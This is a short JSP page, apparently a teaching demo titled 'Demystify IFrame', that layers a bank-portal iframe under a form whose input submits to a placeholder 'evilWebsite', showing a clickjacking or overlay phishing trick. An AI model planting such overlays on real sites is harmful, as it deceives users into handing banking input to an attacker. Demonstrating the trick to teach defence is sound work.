<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %>
<%@ include file="/WEB-INF/views/commonPage.jsp" %>

<html>
<head>

	<title>IFrame Test</title>
</head>
<body>
<h3>Demystify IFrame </h3>
<br><br>

<iframe src="bankPortal" style="width:200px;height:150px;position:absolute;top:200px;left:00px;z-index:-1;opacity:1.0" ></iframe>

<form action="evilWebsite">
<div style="position:relative; top:70px;opacity:1.0"><input type="text"></div>
<input type="submit"  style="position:relative; top:70px;opacity:1.0">
</form>
</body>
</html>